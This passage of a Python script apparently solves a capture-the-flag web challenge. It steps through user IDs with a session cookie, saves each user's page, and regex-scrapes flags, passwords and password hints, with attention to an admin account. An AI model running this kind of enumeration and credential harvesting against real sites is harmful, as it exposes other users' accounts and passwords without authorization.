    resp = safe_request(url, {"PHPSESSID": cookie_value})
    
    if not resp:
        print("  [✗] Failed to get response")
        continue
    
    status = resp.status_code
    content = resp.text
    length = len(content)
    
    print(f"  Status: {status} | Length: {length} bytes")
    
    result = {
        "user_id": user_id,
        "status": status,
        "length": length,
        "content": content
    }
    results.append(result)
    
    # Only analyze successful responses
    if status == 200:
        # Look for flags
        flag_match = re.search(r'FLAG\{[^}]+\}', content)
        if flag_match:
            flag = flag_match.group(0)
            flags_found.append({"user_id": user_id, "flag": flag})
            print(f"  [!] FLAG: {flag}")
        
        # Look for passwords
        pwd_indicator = re.search(r'password[^\n]*', content, re.I)
        if pwd_indicator:
            pwd_line = pwd_indicator.group(0)
            # Extract actual password if in format password="value"
            pwd_value = re.search(r'password["\']?\s*[:=]\s*["\']?([^"\',\s]+)', content, re.I)
            if pwd_value:
                password_info.append({"user_id": user_id, "password": pwd_value.group(1)})
                print(f"  [!] PASSWORD: {pwd_value.group(1)}")
            elif len(pwd_line.strip()) > 0:
                password_info.append({"user_id": user_id, "hint": pwd_line.strip()})
                print(f"  [!] PASSWORD HINT: {pwd_line.strip()}")
        
        # Check for admin (userId=7)
        check_content = content.lower()
        if 'restaurant' in check_content or 'food' in check_content or 'cuisine' in check_content:
            print(f"  [+] Restaurant data found")
        
        print(f"  Response: {content[:200]}")
    else:
        print(f"  [✗] No valid data")
    
    time.sleep(0.2)  # Minimal delay

# Admin account specific analysis (userId=7)
print("\n" + "="*80)
print("ADMIN ACCOUNT ANALYSIS (userId=7)")
